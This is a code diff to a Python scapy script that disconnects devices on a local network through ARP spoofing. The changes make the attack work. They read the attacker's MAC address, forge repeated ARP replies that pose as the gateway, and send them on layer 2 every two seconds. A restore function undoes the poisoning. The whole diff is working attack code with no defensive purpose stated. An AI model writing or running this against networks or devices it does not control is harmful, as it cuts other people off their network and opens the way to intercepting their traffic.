@@ -1,7 +1,7 @@
 import os
 import time
 import csv
-from scapy.all import ARP, Ether, srp, send, conf
+from scapy.all import ARP, Ether, srp, sendp, conf, get_if_hwaddr
 
 WHITELIST = set()
 DISCONNECTED_DEVICES = set()
@@ -44,12 +44,15 @@ def disconnect_device(ip, mac):
     print(f"[!] Disconnecting {ip} ({mac})")
     DISCONNECTED_DEVICES.add(ip)
 
+    iface = conf.iface
+    attacker_mac = get_if_hwaddr(iface)
+
     def loop():
         while ip in DISCONNECTED_DEVICES:
-            arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
-            ether = Ether(dst=mac)
+            arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=attacker_mac)
+            ether = Ether(dst=mac, src=attacker_mac)
             packet = ether / arp
-            send(packet, verbose=0)
+            sendp(packet, iface=iface, verbose=0)
             time.sleep(2)
 
     from threading import Thread
@@ -57,10 +60,13 @@ def disconnect_device(ip, mac):
 
 def restore_device(ip, mac):
     print(f"[+] Restoring {ip} ({mac})")
+    iface = conf.iface
+    attacker_mac = get_if_hwaddr(iface)
+
     arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
-    ether = Ether(dst=mac)
+    ether = Ether(dst=mac, src=attacker_mac)
     packet = ether / arp
-    send(packet, count=5, verbose=0)
+    sendp(packet, iface=iface, count=5, verbose=0)
     DISCONNECTED_DEVICES.discard(ip)
 
 def save_to_csv(devices, filename="scan_results.csv"):
